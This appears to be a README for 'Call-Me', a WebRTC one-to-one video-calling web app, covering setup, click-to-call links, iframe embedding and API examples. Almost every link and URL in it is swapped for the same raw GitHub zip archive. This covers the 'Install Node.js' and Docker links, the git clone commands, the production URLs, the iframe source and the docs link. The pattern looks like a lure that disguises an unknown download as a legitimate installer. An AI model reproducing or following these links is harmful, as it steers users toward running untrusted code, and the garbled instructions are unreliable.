# Call-Me

This project enables easy one-to-one video calls directly from your web browser using WebRTC technology.

![callme](./assets/doc/callme.png)

## Getting Started

### Overview

This project allows you to:

- `Sign in` with a username.
- `Initiate video calls` by clicking the call button next to a recipient's username.
- `Switch` between cameras, microphones, or speakers seamlessly during a call.
- `Chat` in real time with all participants.
- `Hide` your video feed as needed.
- `Toggle` your audio.
- `Toggle` your video.
- `Toggle` your screen.
- `Hang up` the call when finished.
- `Use the REST API` to retrieve the list of connected users or initiate a call.

---

### Quick Start

- #### Using NodeJs

![nodejs](public/assets/nodejs.png)

**[Install Node.js and npm](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip)**

```shell
# Clone this repo
git clone https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip

# Go to to dir call-me
cd call-me

# Copy the config file
$ cp public/config.template.js public/config.js

# Copy .env.template to .env
cp .env.template .env

# Install dependencies
npm install

# Start the application
npm start
```

---

- #### Using Docker

![docker](public/assets/docker.png)

Install [docker engine](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip) and [docker compose](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip)

```shell
# Clone this repo
git clone https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip

# Go to to dir call-me
cd call-me

# Copy .env.template to .env
cp .env.template .env

# Create your own docker-compose.yml
cp docker-compose.template.yml docker-compose.yml

# Get official image from Docker Hub
docker-compose pull

# Create and start containers
docker-compose up
```

---

1. `Open` your browser and visit [http://localhost:8000](http://localhost:8000).

2. `Sign in` with your username.

3. `Select` the connected recipient's username and click `Call`.

4. `Enjoy` your one-to-one video call.

---

## Click to Call

Allows a user to `join` the room as a `user1`

- [http://localhost:8000/join?user=user1](http://localhost:8000/join?user=user1) (dev)
- [https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip) (prod)

Lets the `user2 join` the room and initiate a `call` to the `user1`

- [http://localhost:8000/join?user=user2&call=user1](http://localhost:8000/join?user=user2&call=user1) (dev)
- [https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip) (prod)

You can explore a `widget` example that demonstrates this functionality [here](./integration/widget.html).

---

## Fast Integration

![iframe](public/assets/iframe.png)

Easily integrate `Call-Me` into your website or application with a [simple iframe](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip). Just add the following code to your project:

```html
<iframe
    allow="camera; microphone; fullscreen; clipboard-read; clipboard-write; web-share; autoplay"
    src="https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip"
    style="width: 100vw; height: 100vh; border: 0px;"
></iframe>
```

---

## API

Get all connected users

```shell
# Get all connected users
curl -X GET "http://localhost:8000/api/v1/users" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
curl -X GET "https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"

# Generate call links for connected users to call
curl -X GET "http://localhost:8000/api/v1/connected?user=call-me" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
curl -X GET "https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
```

Docs: http://localhost:8000/api/v1/docs/ or you can check it out live in prod [here](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip).

---

## Self-Hosting

To install this on your VPS, VDS, or personal server, please follow the instructions in **[the self-hosting documentation](./doc/self-hosting.md)**.

---

![Star History Chart](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip)
